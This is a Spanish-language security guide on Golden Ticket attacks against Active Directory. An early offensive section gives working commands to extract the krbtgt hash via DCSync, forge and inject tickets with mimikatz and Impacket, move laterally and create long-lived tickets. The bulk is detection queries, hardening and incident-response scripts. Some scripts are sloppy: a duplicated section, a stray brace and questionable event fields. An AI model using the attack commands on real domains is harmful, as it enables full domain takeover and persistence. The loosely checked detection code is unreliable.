# 🛑 Ataques de **Golden Ticket en Active Directory**

---

## 📝 ¿Qué es Golden Ticket y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica de persistencia avanzada que permite crear tickets de autenticación Kerberos (TGT) falsificados usando el hash NTLM de la cuenta krbtgt. Permite acceso completo y persistente al dominio como cualquier usuario, incluyendo cuentas inexistentes. |
| **Finalidad** | Establecer persistencia de alto nivel tras compromiso del dominio, permitiendo acceso irrestricto sin necesidad de credenciales válidas. Su detección es extremadamente difícil y permite evadir la mayoría de controles de seguridad tradicionales. |

---

## 📈 Elementos críticos para Golden Ticket

| Requisito | Descripción | Obtención |
|-----------|-------------|-----------|
| **Hash krbtgt** | Hash NTLM de la cuenta de servicio krbtgt | DCSync, NTDS.dit extraction, LSA Secrets |
| **Domain SID** | Security Identifier del dominio | `Get-ADDomain`, `whoami /user`, `(New-Object System.Security.Principal.SecurityIdentifier("S-1-5-21-...")).AccountDomainSid` |
| **Domain FQDN** | Nombre completo del dominio | DNS queries, `$env:USERDNSDOMAIN`, `Get-ADDomain` |
| **Target User** | Usuario a suplantar (puede ser ficticio) | Cualquier nombre - Administrator, inexistente, etc. |

> **⚠️ ALERTA CRÍTICA**: Un Golden Ticket permanece válido hasta que se cambie la clave krbtgt (recomendado cada 40 días). Cambios de contraseñas de usuarios NO invalidan Golden Tickets.

### Ejemplo de detección crítica en logs:

```
EventCode: 4769 (Ticket de servicio Kerberos solicitado)
Service Name: krbtgt
Account Name: UsuarioFicticio (inexistente en AD)
Client Address: 192.168.1.100
Ticket Encryption Type: 0x17 (RC4-HMAC)
Result Code: 0x0 (éxito)
```

---

## 🛠️ ¿Cómo funciona y cómo se explota Golden Ticket? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **DCSync para obtener krbtgt** | Extrae el hash NTLM de krbtgt usando privilegios de replicación en Domain Controllers. |
| **NTDS.dit extraction** | Obtiene krbtgt hash desde backup o volcado de la base de datos de Active Directory. |
| **LSA Secrets extraction** | Extrae secretos krbtgt desde memoria de Domain Controller comprometido. |
| **Golden Ticket creation** | Genera TGT falsificado usando mimikatz, ticketer.py o Rubeus con hash krbtgt. |
| **Golden Ticket injection** | Inyecta el ticket falsificado en memoria para usar como credencial válida. |
| **Cross-domain Golden Ticket** | Crea tickets que funcionan entre dominios usando Enterprise Admin SID. |
| **Persistence via Golden Ticket** | Mantiene acceso persistente regenerando tickets antes de expiración. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Obtener hash krbtgt mediante DCSync
impacket-secretsdump -just-dc-user krbtgt domain.com/administrator:Password123@dc.domain.com

# 2. Alternativamente, DCSync con mimikatz
privilege::debug
lsadump::dcsync /domain:domain.com /user:krbtgt

# 3. Obtener Domain SID
Get-ADDomain | Select-Object DomainSID

# 4. Crear Golden Ticket con mimikatz
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-987654321-1122334455 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /ticket:golden.kirbi

# 5. Crear Golden Ticket con Impacket ticketer.py
impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-987654321-1122334455 -domain domain.com Administrator

# 6. Inyectar ticket en memoria (mimikatz)
kerberos::ptt golden.kirbi

# 7. Inyectar ticket (Linux con Impacket)
export KRB5CCNAME=Administrator.ccache

# 8. Verificar acceso con ticket inyectado
dir \\dc.domain.com\C$

# 9. Usar ticket para movimiento lateral
impacket-psexec -k -no-pass domain.com/Administrator@target.domain.com

# 10. Crear Golden Ticket con usuario ficticio
impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-987654321-1122334455 -domain domain.com FakeAdmin

# 11. Golden Ticket de larga duración (10 años)
kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-1234567890-987654321-1122334455 /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d /startoffset:-10 /endin:87600 /renewmax:87600 /ticket:persistent_golden.kirbi
```

---

## 📋 Caso de Uso Completo Splunk

### 🎯 Contexto empresarial y justificación

**Problema de negocio:**
- Golden Tickets proporcionan acceso persistente total al dominio usando credenciales falsificadas
- Un solo Golden Ticket puede comprometer la integridad de todo el entorno AD de forma permanente
- La detección es compleja ya que usan protocolos Kerberos legítimos con tickets técnicamente válidos
- Costo estimado de compromiso persistente del dominio: $2,500,000 USD promedio

**Valor de la detección:**
- Identificación de tickets Kerberos anómalos y usuarios inexistentes
- Detección de patrones de autenticación sospechosos con TGTs de larga duración
- Prevención de persistencia avanzada en 90% de casos
- Cumplimiento con controles críticos de Zero Trust y frameworks de seguridad

### 📐 Arquitectura de implementación

**Prerequisitos técnicos:**
- Splunk Enterprise 8.2+ o Splunk Cloud con licencia suficiente
- Universal Forwarders en todos los Domain Controllers
- Windows TA v8.5+ con configuración completa de eventos Kerberos
- Auditoría avanzada de autenticación Kerberos habilitada
- Baseline de usuarios legítimos para comparación

**Arquitectura de datos:**
```
[Domain Controllers] → [Universal Forwarders] → [Indexers] → [Search Heads]
       ↓                      ↓                     ↓
[EventCode 4768/4769]  [WinEventLog:Security]  [Index: wineventlog]
[Kerberos TGT/TGS]           ↓                      ↓
[User Baseline Data]   [Real-time processing]  [Golden Ticket Alerting]
```

### 🔧 Guía de implementación paso a paso

#### Fase 1: Configuración inicial (Tiempo estimado: 90 min)

1. **Habilitar auditoría avanzada de Kerberos:**
   ```powershell
   # En todos los Domain Controllers
   auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
   auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
   
   # Verificar configuración
   auditpol /get /subcategory:"Kerberos Authentication Service"
   auditpol /get /subcategory:"Kerberos Service Ticket Operations"
   ```

2. **Configurar logging extendido de Kerberos:**
   ```powershell
   # Configuración de registro para eventos detallados
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "LogLevel" -Value 1
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "KerbDebugLevel" -Value 0x1
   ```

3. **Crear baseline de usuarios legítimos:**
   ```splunk
   index=wineventlog EventCode=4768 earliest=-30d@d latest=@d
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
   | stats count by AccountName
   | where count > 5
   | outputlookup legitimate_users_baseline.csv
   ```

#### Fase 2: Implementación de detecciones críticas (Tiempo estimado: 120 min)

1. **Alerta CRÍTICA - Golden Ticket con usuario inexistente:**
   ```splunk
   index=wineventlog EventCode=4768
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
   | rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
   | where ServiceName="krbtgt"
   | lookup legitimate_users_baseline.csv AccountName
   | where isnull(count)
   | eval severity="CRITICAL", technique="Golden Ticket - Nonexistent User"
   | eval risk_score=100
   | table _time, ComputerName, AccountName, ClientAddress, ServiceName, severity, risk_score
   ```

2. **Alerta ALTA - TGT con propiedades anómalas:**
   ```splunk
   index=wineventlog EventCode=4768
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Ticket Encryption Type:\s+(?<EncryptionType>[^\s]+)"
   | rex field=Message "Ticket Options:\s+(?<TicketOptions>[^\s]+)"
   | where EncryptionType="0x17" OR EncryptionType="0x18"
   | eval severity="HIGH", technique="Suspicious TGT Properties"
   | eval risk_score=85
   | table _time, ComputerName, AccountName, EncryptionType, TicketOptions, severity, risk_score
   ```

3. **Alerta MEDIA - TGT de larga duración:**
   ```splunk
   index=wineventlog EventCode=4768
   | rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
   | rex field=Message "Ticket Validity Period:\s+(?<ValidityPeriod>[^\s]+)"
   | where ValidityPeriod > 86400
   | eval severity="MEDIUM", technique="Long Duration TGT"
   | eval risk_score=70
   | table _time, ComputerName, AccountName, ValidityPeriod, severity, risk_score
   ```

#### Fase 3: Dashboard crítico y validación (Tiempo estimado: 90 min)

1. **Dashboard de monitoreo crítico:**
   ```xml
   <dashboard>
     <label>Critical: Golden Ticket Detection</label>
     <row>
       <panel>
         <title>🚨 CRITICAL: Nonexistent User TGT Requests</title>
         <table>
           <search refresh="60s">
             <query>
               index=wineventlog EventCode=4768 earliest=-1h
               | rex field=Message "Account Name:\s+(?&lt;AccountName&gt;[^\s]+)"
               | rex field=Message "Service Name:\s+(?&lt;ServiceName&gt;[^\s]+)"
               | where ServiceName="krbtgt"
               | lookup legitimate_users_baseline.csv AccountName
               | where isnull(count)
               | table _time, ComputerName, AccountName, ClientAddress
             </query>
           </search>
         </table>
       </panel>
     </row>
   </dashboard>
   ```

2. **Pruebas de detección controlada:**
   ```powershell
   # SOLO en entorno de LAB - NUNCA en producción
   # Crear Golden Ticket de prueba con usuario inexistente
   # Ejecutar: kerberos::golden /user:TestGoldenUser /domain:lab.local /sid:S-1-5-21-... /krbtgt:hash
   ```

### ✅ Criterios de éxito

**Métricas críticas:**
- MTTD para Golden Ticket con usuario inexistente: < 5 minutos (CRÍTICO)
- MTTD para TGTs anómalos: < 15 minutos
- Tasa de falsos positivos: < 2% (usuarios legítimos ocasionales)
- Cobertura de detección: 95% (Golden Tickets detectables)

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4768**            | Solicitud TGT - crítico para detectar Golden Tickets con usuarios inexistentes. |
| **EventCode = 4769**            | Solicitud TGS - útil para detectar patrones de uso de Golden Tickets.        |
| **Account Name**                | Usuario solicitante - comparar con baseline de usuarios legítimos.           |
| **Service Name = krbtgt**       | Indica solicitud TGT - todos deben correlacionarse con usuarios válidos.     |
| **Client Address**              | IP origen - detectar patrones geográficos anómalos.                          |
| **Ticket Encryption Type**     | Tipo de cifrado - RC4 (0x17) puede indicar Golden Ticket legacy.            |
| **Ticket Options**             | Opciones del ticket - detectar configuraciones anómalas.                     |

### Query Splunk: Detección de Golden Ticket con usuario inexistente

```splunk
index=wineventlog EventCode=4768
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
| rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
| where ServiceName="krbtgt"
| lookup domain_users.csv username as AccountName
| where isnull(exists)
| eval alert_type="CRITICAL - Golden Ticket Suspected"
| table _time, ComputerName, AccountName, ClientAddress, alert_type
```

### Query: TGTs con propiedades sospechosas

```splunk
index=wineventlog EventCode=4768
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Ticket Encryption Type:\s+(?<EncryptionType>[^\s]+)"
| rex field=Message "Pre-Authentication Type:\s+(?<PreAuthType>[^\s]+)"
| where EncryptionType="0x17" AND PreAuthType="0"
| eval alert_type="HIGH - Suspicious TGT Properties"
| table _time, AccountName, EncryptionType, PreAuthType, alert_type
```

### Query: Detección de patrones de uso de Golden Ticket

```splunk
index=wineventlog EventCode=4769
| rex field=Message "Account Name:\s+(?<AccountName>[^\s]+)"
| rex field=Message "Service Name:\s+(?<ServiceName>[^\s]+)"
| rex field=Message "Client Address:\s+(?<ClientAddress>[^\s]+)"
| stats count dc(ServiceName) as unique_services by AccountName, ClientAddress
| where unique_services > 10
| eval alert_type="MEDIUM - Excessive Service Access"
| table AccountName, ClientAddress, count, unique_services, alert_type
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Golden Ticket - TGT para usuario inexistente
SecurityEvent
| where EventID == 4768 // TGT request
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ServiceName = extract(@"Service Name:\s+([^\s]+)", 1, EventData)
| where ServiceName == "krbtgt"
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4624 // Successful logon
    | extend LogonAccount = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
    | summarize by LogonAccount
) on $left.AccountName == $right.LogonAccount
| project TimeGenerated, Computer, AccountName, ServiceName
| extend AlertType = "CRITICAL - Golden Ticket Suspected"
```

```kql
// Detección de TGT con cifrado RC4 (anómalo en entornos modernos)
SecurityEvent
| where EventID == 4768
| extend EncryptionType = extract(@"Ticket Encryption Type:\s+([^\s]+)", 1, EventData)
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| where EncryptionType == "0x17" // RC4-HMAC
| summarize count() by AccountName, Computer, bin(TimeGenerated, 1h)
| where count_ > 5
| extend AlertType = "HIGH - RC4 TGT Pattern"
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **Nonexistent User TGT** | TGT solicitado para usuario no encontrado en AD | Crítica |
| **RC4 TGT Pattern** | Múltiples TGTs con cifrado RC4 (legacy/anómalo) | Alta |
| **Long Duration TGT** | TGTs con duración superior a política estándar | Media |
| **Cross-Domain Golden** | TGTs entre dominios con propiedades sospechosas | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de Golden Ticket basada en usuarios inexistentes
event_platform=Win event_simpleName=KerberosLogon
| search ServiceName=krbtgt
| join type=left ComputerName [search event_platform=Win event_simpleName=UserLogon | stats values(UserName) as ValidUsers by ComputerName]
| where NOT UserName IN ValidUsers
| table _time, ComputerName, UserName, ServiceName, ClientAddress
| sort - _time
```

```sql
-- Detección de TGTs con propiedades anómalas
event_platform=Win event_simpleName=KerberosLogon
| search EventID=4768 AND EncryptionType=0x17
| stats count by UserName, ComputerName, bin(_time, 1h)
| where count > 10
| eval AlertType="Suspicious RC4 TGT Pattern"
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección principal de Golden Ticket

```kql
// Query principal para detectar Golden Tickets
SecurityEvent
| where EventID == 4768 // TGT request
| extend AccountName = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
| extend ServiceName = extract(@"Service Name:\s+([^\s]+)", 1, EventData)
| extend ClientAddress = extract(@"Client Address:\s+([^\s]+)", 1, EventData)
| where ServiceName == "krbtgt"
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4720 // User account created
    | extend CreatedAccount = extract(@"Account Name:\s+([^\s]+)", 1, EventData)
    | summarize by CreatedAccount
) on $left.AccountName == $right.CreatedAccount
| extend AlertLevel = "CRITICAL", AttackType = "Golden Ticket - Nonexistent User"
| project TimeGenerated, Computer, AccountName, ClientAddress, AlertLevel, AttackType
```

### Hunting avanzado

```kql
// Correlación: DCSync + Golden Ticket
SecurityEvent
| where EventID == 4662 // Object access
| where ObjectName contains "krbtgt"
| extend DCSync_Time = TimeGenerated
| join kind=inner (
    SecurityEvent
    | where EventID == 4768
    | extend TGT_Time = TimeGenerated
) on Computer
| where TGT_Time - DCSync_Time between (0s .. 1h)
| project DCSync_Time, TGT_Time, Computer, AccountName
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Rotación regular de krbtgt**                 | Cambiar contraseña de krbtgt cada 40 días máximo (doble rotación recomendada).                   |
| **Auditoría avanzada de Kerberos**             | Habilitar logging completo de eventos 4768/4769 en todos los DCs.                               |
| **Baseline de usuarios válidos**               | Mantener inventario actualizado de cuentas legítimas para comparación.                           |
| **Cifrado AES obligatorio**                    | Deshabilitar RC4 y DES, usar solo AES256/AES128.                                                |
| **Monitoring de eventos 4662**                | Detectar accesos a objetos krbtgt (posible DCSync).                                             |
| **Credential Guard en DCs**                    | Proteger memoria LSA contra extracción de secretos.                                             |
| **PKINIT enforcement**                          | Requerir certificados para autenticación donde sea posible.                                      |
| **Anomaly detection**                          | ML/AI para detectar patrones anómalos de autenticación Kerberos.                                |
| **Network segmentation**                       | Aislar DCs en VLANs protegidas con monitoreo estricto.                                          |
| **Regular DC compromise assessment**            | Auditorías periódicas para detectar signos de compromiso.                                        |

### Script de rotación de krbtgt

```powershell
# Script para rotación segura de krbtgt (ejecutar dos veces con 24h de diferencia)
$krbtgtAccount = Get-ADUser -Identity krbtgt
$newPassword = ConvertTo-SecureString -String (Get-Random -Count 20 -InputObject ([char[]](65..90+97..122)) | Join-String) -AsPlainText -Force
Set-ADAccountPassword -Identity $krbtgtAccount -NewPassword $newPassword -Reset

Write-Host "krbtgt password rotated. Execute again in 24 hours for complete rotation." -ForegroundColor Yellow
```

---

## 🚨 Respuesta ante incidentes

1. **Aislar inmediatamente sistemas comprometidos** que puedan haber generado el Golden Ticket.
2. **Rotar contraseña krbtgt dos veces** con 24 horas de diferencia para invalidar todos los Golden Tickets.
3. **Analizar logs DCSync** para identificar cómo se obtuvo el hash krbtgt.
4. **Revisar todos los accesos** realizados con el Golden Ticket identificado.
5. **Cambiar credenciales** de todas las cuentas privilegiadas del dominio.
6. **Implementar monitoreo reforzado** de eventos Kerberos 4768/4769.
7. **Realizar forensics** en sistemas comprometidos para identificar vectores de acceso.
8. **Documentar timeline** del incidente y IOCs para prevención futura.
9. **Revisar configuraciones** de seguridad que permitieron el compromiso inicial.

---

## 🧑‍💻 ¿Cómo revisar y detectar Golden Tickets? (PowerShell)

### Verificar última rotación de krbtgt

```powershell
Get-ADUser -Identity krbtgt -Properties PasswordLastSet, whenChanged |
Select-Object Name, PasswordLastSet, whenChanged, @{Name='DaysSincePasswordChange';Expression={(Get-Date) - $_.PasswordLastSet | Select-Object -ExpandProperty Days}}
```

### Buscar eventos de TGT sospechosos

```powershell
# Buscar TGTs para usuarios que no existen en AD
$ValidUsers = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768} -MaxEvents 1000 |
ForEach-Object {
    if ($_.Message -match "Account Name:\s+(\S+)" -and $_.Message -match "Service Name:\s+krbtgt") {
        $AccountName = $matches[1]
        if ($AccountName -notin $ValidUsers) {
            [PSCustomObject]@{
                TimeCreated = $_.TimeCreated
                AccountName = $AccountName
                Message = $_.Message
                Severity = "CRITICAL - Possible Golden Ticket"
            }
        }
    }
} | Format-Table -AutoSize
```

### Monitoreo en tiempo real de eventos krbtgt

```powershell
# Monitor en tiempo real para TGTs sospechosos
Register-WmiEvent -Query "SELECT * FROM Win32_NTLogEvent WHERE LogFile='Security' AND EventCode=4768" -Action {
    $Event = $Event.SourceEventArgs.NewEvent
    if ($Event.Message -match "Service Name:\s+krbtgt" -and $Event.Message -match "Account Name:\s+(\S+)") {
        $AccountName = $matches[1]
        $ValidUsers = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
        if ($AccountName -notin $ValidUsers) {
            Write-Warning "CRÍTICO: Posible Golden Ticket detectado para usuario inexistente: $AccountName en $(Get-Date)"
            Write-Host "Investigar inmediatamente el origen de esta solicitud TGT"
        }
    }
}
```

### Auditoría de configuración de cifrado Kerberos

```powershell
# Verificar configuración de cifrado (debe ser AES, no RC4/DES)
$KerberosPolicy = Get-ADDefaultDomainPasswordPolicy
Get-ADDomain | Select-Object @{Name='EncryptionTypes';Expression={
    $EncTypes = @()
    if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -ErrorAction SilentlyContinue).SupportedEncryptionTypes -band 0x8) { $EncTypes += "AES256" }
    if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -ErrorAction SilentlyContinue).SupportedEncryptionTypes -band 0x10) { $EncTypes += "AES128" }
    if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -ErrorAction SilentlyContinue).SupportedEncryptionTypes -band 0x4) { $EncTypes += "RC4" }
    $EncTypes -join ", "
}}
```

### Script de auditoría completa para Golden Tickets

```powershell
# Auditoría completa de seguridad contra Golden Tickets
Write-Host "=== AUDITORÍA GOLDEN TICKET SECURITY ===" -ForegroundColor Red

# 1. Verificar última rotación krbtgt
$krbtgtInfo = Get-ADUser -Identity krbtgt -Properties PasswordLastSet
$daysSinceRotation = ((Get-Date) - $krbtgtInfo.PasswordLastSet).Days
Write-Host "1. Última rotación krbtgt: $($krbtgtInfo.PasswordLastSet) ($daysSinceRotation días)" -ForegroundColor $(if ($daysSinceRotation -gt 40) { 'Red' } else { 'Green' })

# 2. Verificar eventos TGT recientes para usuarios inexistentes
Write-Host "2. Verificando TGTs sospechosos..." -ForegroundColor Yellow
$ValidUsers = Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName
$SuspiciousTGTs = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768; StartTime=(Get-Date).AddHours(-24)} -ErrorAction SilentlyContinue |
Where-Object { $_.Message -match "Service Name:\s+krbtgt" -and $_.Message -match "Account Name:\s+(\S+)" } |
ForEach-Object {
    $AccountName = if ($_.Message -match "Account Name:\s+(\S+)") { $matches[1] } else { "Unknown" }
    if ($AccountName -notin $ValidUsers) {
        [PSCustomObject]@{
            Time = $_.TimeCreated
            Account = $AccountName
            Source = if ($_.Message -match "Client Address:\s+(\S+)") { $matches[1] } else { "Unknown" }
        }
    }
}

if ($SuspiciousTGTs) {
    Write-Host "⚠️ CRÍTICO: Se encontraron TGTs sospechosos:" -ForegroundColor Red
    $SuspiciousTGTs | Format-Table -AutoSize
} else {
    Write-Host "✓ No se encontraron TGTs sospechosos en las últimas 24 horas" -ForegroundColor Green
}

# 3. Verificar configuración de cifrado
$EncryptionConfig = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -ErrorAction SilentlyContinue
if ($EncryptionConfig -and ($EncryptionConfig.SupportedEncryptionTypes -band 0x4)) {
    Write-Host "⚠️ ADVERTENCIA: RC4 está habilitado (vulnerable a Golden Tickets)" -ForegroundColor Yellow
} else {
    Write-Host "✓ Configuración de cifrado segura (sin RC4)" -ForegroundColor Green
}

# 4. Recomendaciones
Write-Host "=== RECOMENDACIONES ===" -ForegroundColor Cyan
if ($daysSinceRotation -gt 40) {
    Write-Host "- Rotar contraseña krbtgt inmediatamente (doble rotación)" -ForegroundColor Red
}
Write-Host "- Implementar monitoring en tiempo real de eventos 4768" -ForegroundColor Yellow
Write-Host "- Mantener baseline actualizado de usuarios válidos" -ForegroundColor Yellow
Write-Host "- Configurar alertas SIEM para detección automática" -ForegroundColor Yellow
}
```

---

## 🚨 Respuesta ante incidentes

### Procedimientos de respuesta crítica inmediata

1. **Confirmación de Golden Ticket:**
   - Verificar eventos 4768 con solicitudes TGT para usuarios inexistentes o inactivos
   - Analizar tickets con duración anómala o sin validaciones normales de dominio
   - Correlacionar con actividad de extracción previa de credenciales (DCSync, NTDS.dit)

2. **Contención de emergencia (CRÍTICA):**
   - **Rotar inmediatamente la cuenta krbtgt (doble rotación)** - Esta es la ÚNICA forma de invalidar Golden Tickets
   - Aislar redes y sistemas donde se detectó uso de Golden Tickets
   - Bloquear cuentas administrativas sospechosas y cambiar todas las contraseñas de cuentas privilegiadas
   - Implementar segmentación de red de emergencia

3. **Análisis de compromiso total:**
   - Asumir compromiso completo del dominio hasta demostrar lo contrario
   - Identificar el método de obtención del hash krbtgt (DCSync, NTDS.dit, LSA Secrets)
   - Determinar el alcance temporal del compromiso basado en fecha de última rotación krbtgt
   - Catalogar todos los sistemas y datos accedidos con Golden Tickets

4. **Investigación forense especializada:**
   - Buscar herramientas de Golden Ticket (mimikatz, ticketer.py, Rubeus)
   - Analizar logs de Domain Controllers para actividad anómala de replicación
   - Revisar backups de NTDS.dit por accesos no autorizados
   - Verificar integridad de controladores de dominio

5. **Reconstrucción y recuperación:**
   - Realizar doble rotación de krbtgt (esperar replicación entre rotaciones)
   - Reconstruir políticas de seguridad desde baseline conocido
   - Implementar monitoreo avanzado de eventos 4768/4769
   - Establecer programa de rotación regular de krbtgt (cada 40 días)

### Scripts de respuesta de emergencia

```powershell
# Script de respuesta CRÍTICA para Golden Ticket
function Respond-GoldenTicketEmergency {
    param($SuspiciousAccounts, $AffectedSystems)
    
    Write-Host "🚨 INICIANDO RESPUESTA DE EMERGENCIA GOLDEN TICKET 🚨" -ForegroundColor Red
    
    # 1. ROTACIÓN INMEDIATA DE KRBTGT (CRÍTICO)
    Write-Host "1. Rotando cuenta krbtgt (Primera rotación)..." -ForegroundColor Yellow
    $krbtgtUser = Get-ADUser -Identity krbtgt
    $newPassword1 = -join ((33..126) | Get-Random -Count 64 | % {[char]$_})
    Set-ADAccountPassword -Identity $krbtgtUser -NewPassword (ConvertTo-SecureString $newPassword1 -AsPlainText -Force) -Reset
    Write-EventLog -LogName Security -Source "GoldenTicketResponse" -EventId 9005 -Message "EMERGENCY: First krbtgt rotation completed due to Golden Ticket attack"
    
    # Esperar replicación de AD
    Write-Host "Esperando replicación de AD (10 horas)..." -ForegroundColor Yellow
    Write-Host "⚠️ CONTINUAR CON SEGUNDA ROTACIÓN EN 10+ HORAS ⚠️" -ForegroundColor Red
    
    # 2. Bloquear cuentas sospechosas inmediatamente
    foreach ($account in $SuspiciousAccounts) {
        Disable-ADAccount -Identity $account
        Write-EventLog -LogName Security -Source "GoldenTicketResponse" -EventId 9006 -Message "Account $account disabled due to Golden Ticket activity"
    }
    
    # 3. Revocar todas las sesiones Kerberos activas
    foreach ($system in $AffectedSystems) {
        Invoke-Command -ComputerName $system -ScriptBlock {
            klist purge_li
            klist purge
            # Reiniciar servicio Kerberos
            Restart-Service kdc -Force
        } -ErrorAction SilentlyContinue
    }
    
    # 4. Implementar monitoreo de emergencia
    $emergencyMonitorScript = @"
# Monitor emergencia para Golden Tickets
Register-WmiEvent -Query "SELECT * FROM Win32_NTLogEvent WHERE LogFile='Security' AND EventCode=4768" -Action {
    `$Event = `$Event.SourceEventArgs.NewEvent
    if (`$Event.Message -match "Service Name:\s+krbtgt") {
        `$timestamp = Get-Date
        `$message = "EMERGENCY GOLDEN TICKET MONITOR: krbtgt TGT request at `$timestamp"
        Write-EventLog -LogName Application -Source "EmergencyGTMonitor" -EventId 2001 -Message `$message
        Send-MailMessage -To "security-emergency@company.com" -Subject "CRITICAL: Golden Ticket Activity" -Body `$message
    }
}
"@
    
    # 5. Notificación crítica a CISO/management
    $criticalMessage = @"
🚨 INCIDENTE CRÍTICO: GOLDEN TICKET DETECTADO 🚨

Compromiso confirmado del dominio de Active Directory.
Cuenta krbtgt rotada (primera rotación completada).
Sistemas afectados: $($AffectedSystems -join ', ')
Cuentas sospechosas: $($SuspiciousAccounts -join ', ')

ACCIONES REQUERIDAS:
- Segunda rotación de krbtgt en 10+ horas
- Revisión completa de seguridad del dominio
- Posible reconstrucción completa de AD

ESTADO: DOMINIO COMPROMETIDO - NIVEL CRÍTICO
"@
    
    Send-MailMessage -To "ciso@company.com,security-team@company.com" -Subject "🚨 CRITICAL: Golden Ticket Domain Compromise" -Body $criticalMessage
    
    Write-Host "Respuesta de emergencia completada. CONTINUAR CON SEGUNDA ROTACIÓN KRBTGT." -ForegroundColor Red
}

# Script para segunda rotación de krbtgt (ejecutar después de 10+ horas)
function Complete-KrbtgtDoubleRotation {
    Write-Host "🔄 EJECUTANDO SEGUNDA ROTACIÓN KRBTGT..." -ForegroundColor Yellow
    
    $krbtgtUser = Get-ADUser -Identity krbtgt
    $newPassword2 = -join ((33..126) | Get-Random -Count 64 | % {[char]$_})
    Set-ADAccountPassword -Identity $krbtgtUser -NewPassword (ConvertTo-SecureString $newPassword2 -AsPlainText -Force) -Reset
    Write-EventLog -LogName Security -Source "GoldenTicketResponse" -EventId 9007 -Message "EMERGENCY: Second krbtgt rotation completed - Golden Tickets now invalidated"
    
    Write-Host "✅ SEGUNDA ROTACIÓN COMPLETADA - GOLDEN TICKETS INVALIDADOS" -ForegroundColor Green
    Write-Host "Todos los Golden Tickets existentes han sido invalidados permanentemente." -ForegroundColor Green
    
    # Verificar replicación
    Write-Host "Verificando replicación en todos los DCs..." -ForegroundColor Yellow
    $DCs = Get-ADDomainController -Filter *
    foreach ($DC in $DCs) {
        try {
            $krbtgtCheck = Get-ADUser -Identity krbtgt -Server $DC.Name -Properties PasswordLastSet
            Write-Host "DC $($DC.Name): krbtgt PasswordLastSet = $($krbtgtCheck.PasswordLastSet)" -ForegroundColor Cyan
        } catch {
            Write-Warning "No se pudo verificar DC $($DC.Name)"
        }
    }
}
```

### Checklist de respuesta crítica

- [ ] **🚨 CONFIRMACIÓN**: Golden Ticket confirmado via análisis de eventos 4768
- [ ] **🔥 ROTACIÓN 1**: Primera rotación de krbtgt ejecutada inmediatamente
- [ ] **⏱️ ESPERA**: Esperando 10+ horas para replicación completa de AD
- [ ] **🔥 ROTACIÓN 2**: Segunda rotación de krbtgt completada (invalida todos los Golden Tickets)
- [ ] **🔒 CONTENCIÓN**: Sistemas y cuentas sospechosas aisladas y deshabilitadas
- [ ] **🔍 FORENSE**: Investigación del método de obtención del hash krbtgt
- [ ] **📊 MONITOREO**: Monitoreo de emergencia implementado para eventos krbtgt
- [ ] **📋 DOCUMENTACIÓN**: Cronología completa del incidente documentada
- [ ] **🏗️ RECONSTRUCCIÓN**: Evaluación de necesidad de reconstrucción de dominio
- [ ] **📈 SEGUIMIENTO**: Monitoreo intensivo por 90 días post-incidente

### Indicadores críticos de Golden Ticket

```
Eventos definitivos:
- 4768 con Service Name = krbtgt para usuarios inexistentes
